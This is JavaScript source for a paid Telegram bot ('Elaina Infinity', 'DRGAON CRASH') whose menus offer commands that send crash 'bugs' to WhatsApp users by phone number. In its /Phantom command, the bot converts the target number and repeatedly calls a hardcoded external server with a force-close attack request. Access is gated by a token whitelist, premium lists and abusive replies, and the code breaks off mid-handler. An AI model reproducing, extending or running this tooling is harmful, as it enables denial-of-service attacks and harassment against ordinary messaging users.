// Modif By @Alwayskyymodz
const { Telegraf, Markup, session } = require("telegraf"); 
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const { BOT_TOKEN } = require("./config");
const crypto = require("crypto");
const premiumFile = "./premiumuser.json";
const adminFile = "./adminuser.json";
const ownerFile = "./owneruser.json";
const sessionPath = './session';
let bots = [];

const bot = new Telegraf(BOT_TOKEN);


bot.use(session());

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;


/// ------ ( const list blacklist ) ------ \\\
const blacklist = ["6142885267", "7275301558", "1376372484"];



/// ------ ( const random img ) ------ \\\
const randomImages = [
"https://files.catbox.moe/16ebe6.jpg",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];



/// ------ ( Const Runtime ) ------ \\\
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });


/// ------ ( Function Cooldown ) ------ \\\
const COOLDOWN_FILE = path.join(__dirname, "database", "cooldown.json");
let globalCooldown = 0;

function getCooldownData(ownerId) {
  const cooldownPath = path.join(
    DATABASE_DIR,
    "users",
    ownerId.toString(),
    "./library/cooldown.json"
  );
  if (!fs.existsSync(cooldownPath)) {
    fs.writeFileSync(
      cooldownPath,
      JSON.stringify(
        {
          duration: 0,
          lastUsage: 0,
        },
        null,
        2
      )
    );
  }
  return JSON.parse(fs.readFileSync(cooldownPath));
}



function loadCooldownData() {
  try {
    ensureDatabaseFolder();
    if (fs.existsSync(COOLDOWN_FILE)) {
      const data = fs.readFileSync(COOLDOWN_FILE, "utf8");
      return JSON.parse(data);
    }
    return { defaultCooldown: 60 };
  } catch (error) {
    console.error("Error loading cooldown data:", error);
    return { defaultCooldown: 60 };
  }
}

function saveCooldownData(data) {
  try {
    ensureDatabaseFolder();
    fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving cooldown data:", error);
  }
}

function isOnGlobalCooldown() {
  return Date.now() < globalCooldown;
}

/// ------ ( Function Cooldown ) ------ \\\
function setGlobalCooldown() {
  const cooldownData = loadCooldownData();
  globalCooldown = Date.now() + cooldownData.defaultCooldown * 1000;
}

/// ------ ( Function Cooldown ) ------ \\\
function parseCooldownDuration(duration) {
  const match = duration.match(/^(\d+)(s|m)$/);
  if (!match) return null;

  const [_, amount, unit] = match;
  const value = parseInt(amount);

  switch (unit) {
    case "s":
      return value;
    case "m":
      return value * 60;
    default:
      return null;
  }
}

/// ------ ( Function Cooldown ) ------ \\\
function isOnCooldown(ownerId) {
  const cooldownData = getCooldownData(ownerId);
  if (!cooldownData.duration) return false;

  const now = Date.now();
  return now < cooldownData.lastUsage + cooldownData.duration;
}

function formatTime(ms) {
  const totalSeconds = Math.ceil(ms / 1000);
  const minutes = Math.floor(totalSeconds / 60);
  const seconds = totalSeconds % 60;

  if (minutes > 0) {
    return `${minutes} menit ${seconds} detik`;
  }
  return `${seconds} detik`;
}

/// ------ ( Function Cooldown ) ------ \\\
function getRemainingCooldown(ownerId) {
  const cooldownData = getCooldownData(ownerId);
  if (!cooldownData.duration) return 0;

  const now = Date.now();
  const remaining = cooldownData.lastUsage + cooldownData.duration - now;
  return remaining > 0 ? remaining : 0;
}



/// ------ ( Function Date ) ------ \\\
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}



/// ----- ( Function ensureDataBase ) -------- \\\
function ensureDatabaseFolder() {
  const dbFolder = path.join(__dirname, "database");
  if (!fs.existsSync(dbFolder)) {
    fs.mkdirSync(dbFolder, { recursive: true });
  }
}



/// ------- ( Ghitub token ) -------- \\\
const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/${GITHUB_REPO}/main/${GITHUB_FILE_PATH}?timestamp=${Date.now()}"; 

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens; // Asumsikan format JSON: { "tokens": ["TOKEN1", "TOKEN2", ...] }
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
if (!validTokens.includes(BOT_TOKEN)) {
  console.log(chalk.red("❌ GOBLOK LU TOKEN NYA AJA BELUM DI ADD, KALO MAU DI ADD @Alwayskyymodz."));
  process.exit(1);
}

  console.log(chalk.green(` #- Token Valid⠀⠀`));
  startBot();
}

function startBot() {
  console.log(chalk.red(`
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⣉⣉⣥⣤⣤⣤⣤⣤⣤⣤⣈⣉⡙⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⣡⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⡉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢋⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡈⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠟⢁⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠙⢿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠟⢁⣴⣿⣿⣿⣿⠿⣻⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⢛⣛⣛⡛⠛⠿⢿⣿⣿⣿⣿⣿⣿⡻⢿⣿⣿⣿⣷⣄⠹⣿⣿⣿⣿⣿
⣿⣿⣿⡿⠋⣰⣿⡿⠿⠟⠉⣠⣾⣿⣿⣿⠟⣋⣿⡿⣫⣴⡾⣱⣿⢸⣧⢻⣶⣍⠲⣮⣝⡻⢿⣿⣿⣿⣦⠈⠙⠛⢿⣿⣦⠈⢿⣿⣿⣿
⣿⣿⡿⠁⣼⣿⠋⣰⠃⢀⠜⣿⣿⡿⢋⣴⣟⡻⢋⣼⣿⣿⢡⣿⣿⣼⣿⣆⢻⣿⣷⡌⢿⣛⣧⣝⢿⣿⣿⡁⡄⠈⢧⠙⢿⣷⡀⢻⣿⣿
⣿⣿⠁⣾⠟⡅⠀⡧⠒⠁⣼⣿⢏⣴⣿⣿⡿⢣⣾⣾⣿⡅⣿⠋⠡⢌⠉⢻⣾⣿⣶⣿⣎⢻⣿⣿⣷⣝⢿⣷⡈⠓⢬⡄⠈⡙⣷⡀⢻⣿
⣿⠃⣼⡏⢸⡇⠈⢀⡄⣾⡿⣡⣿⣿⣿⣿⢣⣿⣿⣿⣿⣷⣿⣷⣾⠈⣀⣼⣿⣿⣿⣿⣿⡎⢿⣿⣿⣿⣎⢻⣿⡀⡀⠁⢀⡇⠘⣷⠈⣿
⡟⢠⣿⠁⠀⡇⠔⠉⣸⣿⢡⣿⣿⣭⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢼⣿⣿⣿⣿⣿⣿⣿⣿⣼⣟⣿⣿⣿⡆⢿⣧⠈⠳⣘⡇⠀⣿⡇⢸
⠃⢸⠏⡄⠀⠇⢀⣴⣿⡇⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣄⣀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡘⣿⡇⠀⠘⠃⢀⡿⣿⠈
⠀⣿⠀⢿⡀⢠⡞⢸⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠉⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢻⣇⠹⣄⠀⣼⠃⣿⡀
⠀⣿⡀⠈⣧⡏⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠉⢠⣿⠆⠐⢾⡇⠈⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢾⣿⡀⠙⣦⠃⠀⣿⡇
⠀⣿⣧⠀⠸⠀⢰⢻⣿⠻⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⣼⣿⡏⠸⣿⣿⠀⠀⠀⠀⠀⠈⢹⣿⣿⣿⣿⣿⡇⣾⡿⣇⠀⡏⠀⣸⣿⠁
⡄⢸⠈⢷⡄⠀⡿⠀⣿⡇⢿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⣿⡟⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⢁⣿⠃⢹⡀⢀⣼⠃⣿⠀
⣧⠘⣧⠀⠙⢦⡇⠀⠙⢿⡜⣿⢟⣛⣭⠀⠀⠀⠀⠀⠀⠀⠀⢻⡇⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⣭⣝⣛⠿⠏⣾⢏⠀⢸⡥⠋⠁⣰⡇⢸
⣿⡄⢻⡷⣄⠀⠃⠀⢸⠈⢷⡙⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⢏⡼⠃⣾⠀⠘⠁⢀⢼⡿⢀⣿
⣿⣷⡀⢿⡈⠳⣤⡀⠘⡇⠈⢿⣮⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣣⣾⠃⢠⡇⢀⣠⠶⢋⣼⠃⣼⣿
⣿⣿⣷⡀⢻⣄⡀⠉⠓⠾⡀⠘⡌⠻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠟⢩⠆⠀⡼⠚⠋⠁⣠⡾⠃⣼⣿⣿
⣿⣿⣿⣷⡄⠹⣿⡢⣄⣀⡀⠀⠙⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⠀⢀⣀⣠⠴⣾⡟⢁⣼⣿⣿⣿
⣿⣿⣿⣿⣿⣦⡈⢿⣦⣉⠉⠛⠛⠚⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⠃⠚⠛⠉⢉⣤⡾⠋⣠⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣄⡙⠿⣿⡒⠶⠦⠶⠶⠾⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⠶⠶⠴⠶⢖⣾⡿⠋⣠⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣈⠛⢷⣦⣤⣄⣤⣤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣤⣤⣤⡶⠟⢉⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣈⠙⠻⠿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡿⠿⠛⣉⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿



─ 𝑬𝒍𝒂𝒊𝒏𝒂⏤͟͟͞͞ 𝑰𝒏𝒇𝒊𝒏𝒊𝒕𝒚 💥
Note : THANKS BUY FOR MY SCRIPT 
Developer : Alwayskyymodz
Channel: allinfoAkwayskyy.t.me
=========================================
`)
  );
}

validateToken();
/// ------ ( console log function WhatsApp ) ------- \\\
const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState("./session");
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }), // Log level diubah ke "info"
    auth: state,
    browser: ["Mac OS", "Safari", "10.15.7"],
    getMessage: async (key) => ({
      conversation: "P", // Placeholder, you can change this or remove it
    }),
  };

  sock = makeWASocket(connectionOptions);

  sock.ev.on("creds.update", saveCreds);
  

  sock.ev.on("connection.update", (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "open") {
      isWhatsAppConnected = true;
      console.log(
        chalk.white.bold(`
 ボットのステータス。 ( 🕷️ )
 ${chalk.green.bold("WHATSAPP TERHUBUNG")}
`)
      );
    }

    if (connection === "close") {
      const shouldReconnect =
        lastDisconnect?.error?.output?.statusCode !==
        DisconnectReason.loggedOut;
      console.log(
        chalk.white.bold(`
 ボットのステータス。 ( 🕷️ )        
 ${chalk.red.bold("WHATSAPP TERPUTUS")}
`),
        shouldReconnect
          ? chalk.white.bold(`
 ボットのステータス。 ( 🕷️ )         
 ${chalk.red.bold("HUBUNGKAN ULANG")}
`)
          : ""
      );
      if (shouldReconnect) {
        startSesi();
      }
      isWhatsAppConnected = false;
    }
  });
};


/// ---- ( const loadJson ) ----- \\\
const loadJSON = (file) => {
  if (!fs.existsSync(file)) return [];
  return JSON.parse(fs.readFileSync(file, "utf8"));
};


/// ----- ( const saveJson ) ------- \\\
const saveJSON = (file, data) => {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
};



//// -------- ( Function Delete Session ) -------- \\\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}


/// Muat ID owner dan pengguna premium \\\
let ownerUsers = loadJSON(ownerFile);
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);



/// ---- ( Middleware untuk memeriksa apakah pengguna adalah owner ) ------- \\\
const checkOwner = (ctx, next) => {
  if (!ownerUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("💢 Lu siapa? Lu bukan owner anjing kontol bangsat...");
  }
  next();
};

const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply(
      "💢 Lu siapa? Lu belum ada akses admin bodoh..."
    );
  }
  next();
};


/// --- ( Middleware untuk memeriksa apakah pengguna adalah premium ) ---- \\\

const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("💢 Lu Belum premium kentod...");
  }
  next();
};


/// -------- ( const nambah admin ) -------- \\\
const addAdmin = (userId) => {
  if (!adminList.includes(userId)) {
    adminList.push(userId);
    saveAdmins();
  }
};


/// --------- ( const delete admin ) ----------- \\\
const removeAdmin = (userId) => {
  adminList = adminList.filter((id) => id !== userId);
  saveAdmins();
};


/// -------- ( const list admin ) ------- \\\
const saveAdmins = () => {
  fs.writeFileSync("./admins.json", JSON.stringify(adminList));
};


/// ------- ( const case admin ) -------- \\\
const loadAdmins = () => {
  try {
    const data = fs.readFileSync("./admins.json");
    adminList = JSON.parse(data);
  } catch (error) {
    console.error(chalk.red("Gagal memuat daftar admin:"), error);
    adminList = [];
  }
};



/// ----- ( function sleep ( mengatur kecepatan mengirim bug )) ----- \\\
function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

/// -------- ( menu utama ) --------- \\\
bot.start(async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();  
  const date = getCurrentDate();  
  const fallbackKeyboard = {
    inline_keyboard: [
      [{ text: "DEVELOPER", url: "https://t.me/Alwayskyymodz" }],
    ],
  };

  if (!isPremium) {
    return ctx.replyWithPhoto(getRandomImage(), {
      caption: ` 
     <blockquote>𖣂。𝑬𝒍𝒂𝒊𝒏𝒂⏤͟͟͞͞ 𝑰𝒏𝒇𝒊𝒏𝒊𝒕𝒚  𖣂。</blockquote>
     maklu bre.`,      
      parse_mode: "HTML",
      reply_markup: fallbackKeyboard,
    });
  }  

  const mainMenuMessage = `<blockquote>交 DRGAON CRASH ᝄ</blockquote>
( 🕷️ ) Olà ¿ ${Name}
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください. 

┏━ᖫ 𝐈 𝐍 𝐅 𝐎 𝐑 𝐌 𝐀 𝐒 𝐈 ᖭ
┃⌬ Bot Name : 𝑬𝒍𝒂𝒊𝒏𝒂⏤͟͟͞͞ 𝑰𝒏𝒇𝒊𝒏𝒊𝒕𝒚 
┃⌬ Version : 1.0
┃⌬ Status : Buy Only
┃⌬ Telegram : t.me/Alwayskyymodz
┃⌬ Laungage : JavaScript
┃⌬ Type : Button
┃⌬ Framework : Telegraf
┗━━━━━━━━━━━━━━━━━━━━
┏━ᖫ 𝐒𝐓𝐀𝐓𝐔𝐒 𝐏𝐄𝐍𝐆𝐆𝐔𝐍𝐀 ᖭ
┃⌬ User Id : ${userId}
┃⌬ Username : ${Name}
┃⌬ Status Premium : ${isPremium ? "✅" : "❎"}
┃⌬ RunTime : ${waktuRunPanel}
┗━━━━━━━━━━━━━━━━━━━━
╭── ────────── ────╮
│[ sᴇʟᴇᴄᴛ ʙᴜᴛᴛᴏɴ ᴍᴇɴᴜ ]
╰── ────────── ────╯
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const mainKeyboard = [
    [
      {
        text: "𝐀𝐓𝐓𝐀𝐂𝐊 𝐃𝐑𝐀𝐆𝐎𝐍",
        callback_data: "/bugmenu",
      },
      {
        text: "𝐓𝐐𝐓𝐐",
        callback_data: "/thanks",
      },
    ],
    [
      {
        text: "𝐀𝐂𝐂𝐄𝐒 𝐌𝐄𝐍𝐔",
        callback_data: "/ownermenu",
      },
    ],
    [ 
      {
        text: "𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍", 
        url: "https://t.me/allinfoAkwayskyy",
      }
    ],
  ];

  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});


/// ---------- ( handler akses menu ) ----------- \\\
bot.action("/ownermenu", async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `<blockquote>交 DRGAON CRASH ᝄ</blockquote>
( 🕷️ ) Olà ¿ ${Name}
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください. 

╭─────────────────────
│ ⬡ /addprem - ID
│ ╰➤ add premium acces
╰─────────────────────
╭─────────────────────
│ ⬡ /delprem - ID
│ ╰➤ remove premium access
╰─────────────────────
╭─────────────────────
│ ⬡ /addadmin - ID
│ ╰➤ add admin access
╰─────────────────────
╭─────────────────────
│ ⬡ /deladmin - ID
│ ╰➤ remove admin access
╰─────────────────────
╭─────────────────────
│ ⬡ /addpairing - 62xxx
│ ╰➤ add whatsapp number
╰─────────────────────
╭─────────────────────
│ ⬡ /setjeda - 5m
│ ╰➤ setting time  jeda
╰─────────────────────
╭─────────────────────
│ ⬡ /cekid
│ ╰➤ untuk mengecek id anda
╰─────────────────────
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "6 6 6!", callback_data: "/back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});


/// ---------- ( hendler bug menu ) --------- \\\
bot.action("/bugmenu", async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `<blockquote>交 DRGAON CRASH ᝄ</blockquote>
( 🕷️ ) Olà ¿ ${Name}
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください. 


╭━━━『 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 』━━━⬣
│
│ 𑁍 /force - 62××
│  ╰➤ ғᴏʀᴄᴇᴄʟᴏsᴇ ɪɴᴠɪsɪʙʟᴇ
│
│ 𑁍 /invisible - 62××
│  ╰➤ ɪɴᴠɪsɪʙʟᴇ ʜᴀʀᴅ ɴᴇᴡ
│
│ 𑁍 /delayblank - 62××
│  ╰➤ ʙʟᴀɴᴋ ᴅᴇʟᴀʏ ʜᴀʀᴅ
│
│ 𑁍 /Ui - 62××
│  ╰➤ ᴜɪ ʜᴀʀᴅ ɴᴇᴡ
│
│ 𑁍 /blank - 62××
│  ╰➤ ʙʟᴀɴᴋ ɴᴇᴡ ɴᴏ ᴄʟɪᴄᴋ
│
│ 𑁍 /System - 62××
│  ╰➤ sʏsᴛᴇᴍ ᴄʀᴀsʜ ᴅᴇᴠɪᴄᴇ
│
╰━━━━━━━━━━━━━━━━━━━━━━⬣

( ! ) — Dilarang Menyalah gunakan!! 
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "BACK MENU", callback_data: "/back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});


/// -------- ( hendler thanks too menu ) --------- \\\
bot.action("/thanks", async (ctx) => {
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `<blockquote>交 DRGAON CRASH ᝄ</blockquote>
( 🕷️ ) Olà ¿ ${Name}
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください. 

— Alwayskyymodz ( Author )
`;

  const media = {
    type: "photo",
    media: getRandomImage(), // Gambar acak
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "6 6 6!", callback_data: "/back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});


/// ---------- ( handler back to menu ) ----------- \\\
bot.action("/back", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();  
  const date = getCurrentDate();  
  const fallbackKeyboard = {
    inline_keyboard: [
      [{ text: "𝟕𝟕𝟕¿", url: "https://t.me/Alwayskyymodz" }],
    ],
  };

  if (!isPremium) {
    return ctx.replyWithPhoto(getRandomImage(), {
      caption: ` 
     <blockquote>𖣂。𝑬𝒍𝒂𝒊𝒏𝒂⏤͟͟͞͞ 𝑰𝒏𝒇𝒊𝒏𝒊𝒕𝒚  𖣂。</blockquote>
     maklu bre.`,      
      parse_mode: "HTML",
      reply_markup: fallbackKeyboard,
    });
  }  

  const mainMenuMessage = `<blockquote>交 DRGAON CRASH ᝄ</blockquote>
( 🕷️ ) Olà ¿ ${Name}
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください. 

┏━ᖫ 𝐈 𝐍 𝐅 𝐎 𝐑 𝐌 𝐀 𝐒 𝐈 ᖭ
┃⌬ Bot Name : 𝑬𝒍𝒂𝒊𝒏𝒂⏤͟͟͞͞ 𝑰𝒏𝒇𝒊𝒏𝒊𝒕𝒚 
┃⌬ Version : 1.0
┃⌬ Status : Buy Only
┃⌬ Telegram : t.me/Alwayskyymodz
┃⌬ Laungage : JavaScript
┃⌬ Type : Button
┃⌬ Framework : Telegraf
┗━━━━━━━━━━━━━━━━━━━━
┏━ᖫ 𝐒𝐓𝐀𝐓𝐔𝐒 𝐏𝐄𝐍𝐆𝐆𝐔𝐍𝐀 ᖭ
┃⌬ User Id : ${userId}
┃⌬ Username : ${Name}
┃⌬ Status Premium : ${isPremium ? "✅" : "❎"}
┃⌬ RunTime : ${waktuRunPanel}
┗━━━━━━━━━━━━━━━━━━━━
╭── ────────── ────╮
│[ sᴇʟᴇᴄᴛ ʙᴜᴛᴛᴏɴ ᴍᴇɴᴜ ]
╰── ────────── ────╯
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const mainKeyboard = [
    [
      {
        text: "𝐀𝐓𝐓𝐀𝐂𝐊 𝐃𝐑𝐀𝐆𝐎𝐍",
        callback_data: "/bugmenu",
      },
      {
        text: "𝐓𝐐𝐓𝐐",
        callback_data: "/thanks",
      },
    ],
    [
      {
        text: "𝐀𝐂𝐂𝐄𝐒 𝐌𝐄𝐍𝐔",
        callback_data: "/ownermenu",
      },
    ],
    [ 
      {
        text: "𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍", 
        url: "https://t.me/allinfoAkwayskyy",
      }
    ],
  ];

  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});




/// -------- ( Case SetJeda ) --------- \\\
bot.command("setjeda", checkAdmin, async (ctx) => {
  const match = ctx.message.text.split(" ");
  const duration = match[1] ? match[1].trim() : null;


  if (!duration) {
    return ctx.reply(`example /setjeda 60s`);
  }

  const seconds = parseCooldownDuration(duration);

  if (seconds === null) {
    return ctx.reply(
      `/setjeda <durasi>\nContoh: /setcd 60s atau /setcd 10m\n(s=detik, m=menit)`
    );
  }

  const cooldownData = loadCooldownData();
  cooldownData.defaultCooldown = seconds;
  saveCooldownData(cooldownData);

  const displayTime =
    seconds >= 60 ? `${Math.floor(seconds / 60)} menit` : `${seconds} detik`;

  await ctx.reply(`Cooldown global diatur ke ${displayTime}`);
});


/// -------- ( Api Bug ) ---------- \\

bot.command("Phantom", checkPremium, async (ctx) => {
  const userId = ctx.from.id.toString();
  const q = ctx.message.text.split(" ")[1];
  const date = getCurrentDate();

  if (!q) {
    return ctx.reply("Example: /Phantom 628xxxx", { parse_mode: "Markdown" });
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const url = `http://152.42.182.93:2008/dzee?type=fc&chatId=${target}`;

  const caption = `
<b>Empir𝖾́ - Cràsher ♱</b>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

<b>バグ情報</b>
☇ Target: ${q}
☇ Status: Process
☇ Type: /Phantom
☇ Date now: ${date}`;

  const sent = await ctx.replyWithPhoto(
    { url: "https://files.catbox.moe/ujr7p6.jpg" }, 
    {
      caption,
      parse_mode: "HTML",
      reply_to_message_id: ctx.message.message_id,
      ...Markup.inlineKeyboard([
        [
          Markup.button.url("💐 sock° Info¿", "https://t.me/Verowxabout")
        ]
      ])
    }
  );

  for (let i = 10; i <= 90; i += 10) {
    await new Promise(res => setTimeout(res, 500));
    const updatedCaption = `
<b>Empir𝖾́ - Cràsher ♱</b>
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

<b>バグ情報</b>
☇ Target: ${q}
☇ Status: Process ${i}%
☇ Type: /Phantom
☇ Date now: ${date}`;

    await ctx.telegram.editMessageCaption(ctx.chat.id, sent.message_id, null, updatedCaption, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "💐 sock° Info¿", url: "https://t.me/Verowxabout" }
          ]
        ]
      }
    });
  }

  try {
    for (let i = 0; i < 5; i++) {
      await new Promise(resolve => setTimeout(resolve, 3000));
      await axios.get(url);
    }

    const successCaption = `
